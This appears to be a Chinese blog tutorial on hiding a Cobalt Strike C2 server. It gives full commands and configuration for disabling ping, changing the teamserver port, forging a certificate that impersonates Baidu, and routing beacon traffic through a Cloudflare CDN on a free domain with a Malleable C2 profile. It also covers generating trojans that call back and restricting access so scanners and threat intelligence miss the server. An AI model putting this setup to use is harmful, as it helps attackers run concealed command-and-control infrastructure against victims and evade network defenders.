根据现有检测机制，来对服务器进行隐藏，增加c2服务器被检测到的几率。

> CDN：cloudflare
>
> 服务器：阿里云香港 debian10 amd64
>
> 证书：let's encrypt 免费证书
>
> 域名：dot.tk免费域名
>
> CS：CobaltStrike 4.2

## 一、CS服务端配置

上传CS到服务器，配置java坏境等步骤略。  
需要做的操作分别为：禁ping、修改默认端口、修改客户端连接证书。

### 1.1 服务器禁ping

当服务器禁ping后，从某种角度可以判定为主机为不存活状态。

1.1.1 修改系统配置。

编辑文件/etc/sysctl.conf，在里面增加一行。  
`net.ipv4.icmp_echo_ignore_all=1`  
之后使命命令`sysctl -p`使配置生效  
![-w504](https://image.3001.net/images/20210129/1611897891_60139c238cb5be19129a3.jpg!small)  
之后在ping就无法ping通了。  
这种方式nmap还是可以扫描到服务器的存活的。

1.1.2 云服务器防火墙（安全组）

使用云服务器防火墙的方式可以更好的控制流量不流向云服务器本身。从外层入口阻断流量。  
前提是需要你的服务器为ecs服务器，不能我这种轻量级主机。具体的操作这里就不记录操作了。毕竟我也没有这样还样的服务器。

### 1.2 修改端口

编辑teamserver文件，搜索50050，将其改为任意端口即可，这里改成53389。

![-w684](https://image.3001.net/images/20210129/1611897892_60139c245d960088dec5a.jpg!small)保存退出再次启动时端口就变化了。![-w391](https://image.3001.net/images/20210129/1611897893_60139c25149be60990824.jpg!small)

### 1.3 修改默认证书

因为cs服务端生成的证书含有cs的相关特征所有，这里进行修改替换。修改方式有两种，分别为生成密钥库和修改启动文件。无论是那种方式都需要删去原有的文件cobaltstrike.store

1.3.1 方法一生成证书

1\. 删除密钥库文件cobaltstrike.store

2\. 使用命令`keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass
123456 -genkey -keyalg RSA -alias baidu -dname "CN=baidu.com, OU=service
operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd,
L=beijing, S=beijing, C=CN"`可以生成新的密钥库文件

3\. 使用命令`keytool -list -keystore cobaltstrike.store
`查看证书![-w681](https://image.3001.net/images/20210129/1611897893_60139c25c2c7caf74b9e9.jpg!small)

4\.
启动服务器查看证书签名是否相同。![-w695](https://image.3001.net/images/20210129/1611897894_60139c2678e6ffeb0828b.jpg!small)

1.3.2 方法二修改文件

teamserver
是启动cs服务端的启动文件。里面有环境检测的部分，其中就包括密钥库的检测，这部分的写法是，如检测不到密钥库就使用命令生成新的密钥库，修改这里生成命令。![-w690](https://image.3001.net/images/20210129/1611897895_60139c27305ef88ee4f6d.jpg!small)

将其改为`keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456
-genkey -keyalg RSA -alias baidu.com -dname "CN=baidu.com, OU=service
operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd,
L=Beijing, S=Beijing, C=CN"`  
删除原有的./cobaltstrike.store密钥库文件，下次启动时会自动生成新的密钥库文件。  
这个密钥库也可以使用下面通过cloudflare申请的密钥库代理。

## 二、使用CDN隐藏

cs生成的木马中会带有服务器的部分信息如IP、域名，使用cdn就可以很好的隐藏住这部分信息，并且在一定程度上可以规避杀毒软件的主机特征查杀。并且在其他大佬的文章中看到https的监听方式中不会采用cobaltstrike.store的密钥库。所以这里申请一个证书代替https监听方式中的默认证书。

### 2.1 申请免费域名

使用免费域名的好处是不会有过多的信息记录下来。  
访问https://www.freenom.com/zh/index.html注册，可以免费使用一年。具体注册疑问可以参考知乎文章
<https://zhuanlan.zhihu.com/p/115535965>  
![-w831](https://image.3001.net/images/20210129/1611897896_60139c2834060d3ed90e2.jpg!small)

选择时长，免费12个月  
![-w1276](https://image.3001.net/images/20210129/1611897896_60139c28e7e07f6709cc1.jpg!small)注册成功  
![-w705](https://image.3001.net/images/20210129/1611897897_60139c29b34154bbe6a97.jpg!small)

这里我们用域名dotdotdotdot.tk做演示，演示结束后一段时间后删除域名。

### 2.2 CDN配置

cdn部分可以选择其实挺多的，这里选择的是cloudflare。  
1、注册账号  
2、添加站点、选择免费计划、之后会扫描dns记录  
![-w1129](https://image.3001.net/images/20210129/1611897898_60139c2a7eba001903dcd.jpg!small)![-w986](https://image.3001.net/images/20210129/1611897899_60139c2b7b61844a7cfe2.jpg!small)3、修改dotdotdotdot.tk的dns服务器为cloudflare。修改完成后需要一定的时间生效  
![-w920](https://image.3001.net/images/20210129/1611897900_60139c2c3086a0d4323fe.jpg!small)![-w754](https://image.3001.net/images/20210129/1611897900_60139c2cdd71deda255ae.jpg!small)![-w801](https://image.3001.net/images/20210129/1611897901_60139c2df3dfc94b89045.jpg!small)4、关闭自动https重写和始终使用https、broti压缩  
5、出现如下界面就设置生效，可以使用cloudflare进行域名解析操作了。  
![-w787](https://image.3001.net/images/20210129/1611897902_60139c2eb5b469ee960de.jpg!small)6、解析一个baidu.dotdotdotdot.tk测试一下。  
![-w1083](https://image.3001.net/images/20210129/1611897903_60139c2f8a6324a8bf0a4.jpg!small)![-w568](https://image.3001.net/images/20210129/1611897904_60139c305c52a6c60f07f.jpg!small)7、解析域名到你的vps上，配置如下。代理状态为已代理，这样所有的流量会流经cdn。  
![-w806](https://image.3001.net/images/20210129/1611897905_60139c310b66b16d0503d.jpg!small)

`ping baidubaidu.dotdotdotdot.tk`此时CDN已经生效  
![-w550](https://image.3001.net/images/20210129/1611897906_60139c323c3c280bce8a3.jpg!small)8、配置SSL/TLS加密模式为完全  
![-w1200](https://image.3001.net/images/20210129/1611897906_60139c32ed879a69c991f.jpg!small)

### 2.3 cloudflare生成证书

在cloudflare的dash页面找到SSL/TLS->源服务器->创建证书，之后将公钥和私钥保存下来，分别为server.pem和server.key。一定要在生成的时候保存，不然可能找不到私钥了。

2.3.1 申请证书并打包密钥库

将证书打包并生成store文件  
`openssl pkcs12 -export -in server.pem -inkey server.key -out
baidubaidu.dotdotdotdot.tk.p12 -name baidubaidu.dotdotdotdot.tk -passout
pass:123456`  
`keytool -importkeystore -deststorepass 123456 -destkeypass 123456
-destkeystore baidubaidu.dotdotdotdot.tk.store -srckeystore
baidubaidu.dotdotdotdot.tk.p12 -srcstoretype PKCS12 -srcstorepass 123456
-alias baidubaidu.dotdotdotdot.tk`

### 2.4 配置证书到https的监听方式中。

要想使用我们自己申请的证书，这里就需要使用‘Malleable C2
profile’的方式来操作。这里以cloudflare.profile为例。将生成的密钥文件.store放到cs目录下，想cloudflare.profile加入证书配置：  
其中需要注意的是https-certificate为证书相关的配置，其他client.header中Host的值要为我们申请的域名，其他的部分，根据个人情况去配置。

    
    
    https-certificate {
        set keystore "baidubaidu.dotdotdotdot.tk.store";
        set password "123456";
    }
    http-stager {
        set uri_x86 "/api/1";
        set uri_x64 "/api/2";
        client {
            header "Host" "baidubaidu.dotdotdotdot.tk";}
        server {
            output{
            print;
            }
        }
            }
    http-get {
        set uri "/api/3";
        client {
            header "Host" "baidubaidu.dotdotdotdot.tk";
            metadata {
                base64;
                header "Cookie";
            }
            }
        server {
            output{
            print;
            }
        }
            }
    http-post {
        set uri "/api/4";
        client {
            header "Host" "baidubaidu.dotdotdotdot.tk";
            id {
                uri-append;
            }
            output{
            print;
            }
        }
        server {
            output{
            print;
            }
        }
    }
    

使用命令"./c2lint cloudflare.profile"去验证配置文件是否有问题。如下为验证成功的配置。  
![-w687](https://image.3001.net/images/20210129/1611897908_60139c3428c58669da317.jpg!small)验证配置失败，会爆出如下错误，根据报错结果去修改你的配置文件。配置文件参考官方[帮助文件](https://www.cobaltstrike.com/help-malleable-c2)  
![-w484](https://image.3001.net/images/20210129/1611897909_60139c352f80bd1b6cb9b.jpg!small)使用配置文件启动服务器  
`./teamserver 172.17.21.142 123456 cloudflare.profile`  
![-w501](https://image.3001.net/images/20210129/1611897909_60139c35dbbe8bc2008b2.jpg!small)

### 2.5 配置文件生成仓库

github上有一个仓库，可以用于生成c2配置文件，如果使用此种方式需要在木马生成部分的备注，不然可能会导致木马无法上线。  
使用方式：

    
    
    #安装命令
    git clone https://github.com/FortyNorthSecurity/C2concealer && cd C2concealer && chmod +x install.sh && ./install.sh
    #使用命令
    C2concealer --variant 1 --hostname "baidubaidu.dotdotdotdot.tk"
    #域名记得加引号
    

baidu.store就是baidubaidu.dotdotdotdot.tk.store为了方便就改了文件名。  
![-w882](https://image.3001.net/images/20210129/1611897910_60139c368d44ce7a6205b.jpg!small)  
之后使用生成后的profile文件启动服务器即可

### 2.6 生成木马配置

作了如上的配置，在生成木马时需要做一些不一样的操作。  
**注意：**免费版本的cloudflare支持解析少量的端口，具体端口如下  
 **http:**  
80、8080、8880、2052、2082、2086、2095  
 **https:**  
443、2053、2083、2087、2096、8443  
![-w491](https://image.3001.net/images/20210129/1611897911_60139c374e4a6b51fb902.jpg!small)之后生成木马，运行即可上线  
![-w390](https://image.3001.net/images/20210129/1611897911_60139c37e49ba1cfd9cb8.jpg!small)

![-w778](https://image.3001.net/images/20210129/1611897912_60139c38a32db4f47085e.jpg!small)

powershell的上线方式与以前有些许不同。需要启动ssl证书。  
![-w406](https://image.3001.net/images/20210129/1611897914_60139c3a4ab233a842b9b.jpg!small)

备注：如果使用C2concealer生成profile，需要配置listener时在profile中选择variant_1才行，不然可能会导致无法上线。  
![-w468](https://image.3001.net/images/20210129/1611897915_60139c3b0ca9fc3d23338.jpg!small)

## 三、写在最后

1、服务器防火墙，c2上线端口只能让cdn的IP访问，这样可以避免被扫描器扫描到，将你的IP加入威胁情报中去。具体配置可以在云服务器安全组操作。或者在服务器使用iptables操作。  
2、证书申请这部分我走了很多的弯路，之前打算使用let's Encrypt后来发现无论怎么操作都无法上线，  
3、实际上这些操作都是服务器本身的隐藏，要想更好的使用CobaltStrike可能还需要做免杀，做木马文件签名等操作。  
4、这些配置做完后，及时服务器不在继续使用，也可以将文件打包拷贝到新服务器中，后面只需更新DNS解析即可。

### cloudflare 使用的IP段

全部IP段

    
    
    173.245.48.0/20
    103.21.244.0/22
    103.22.200.0/22
    103.31.4.0/22
    141.101.64.0/18
    108.162.192.0/18
    190.93.240.0/20
    188.114.96.0/20
    197.234.240.0/22
    198.41.128.0/17
    162.158.0.0/15
    104.16.0.0/12
    172.64.0.0/13
    131.0.72.0/22
    

国内IP段是cloudflare与百度云合作的节点

    
    
    162.159.211.4-103
    103.21.244.0/22
    103.22.200.0/22
    103.31.4.0/22
    104.16.0.0/12
    108.162.192.0/18
    131.0.72.0/22
    141.101.64.0/18
    162.158.0.0/15
    172.64.0.0/13
    173.245.48.0/20
    188.114.96.0/20
    190.93.240.0/20
    197.234.240.0/22
    198.41.128.0/17
    

## 参考链接

> https://blog.csdn.net/god_zzZ/article/details/109057803
>
>
> https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/
>
> https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-> network-ports-compatible-with-Cloudflare-s-proxy

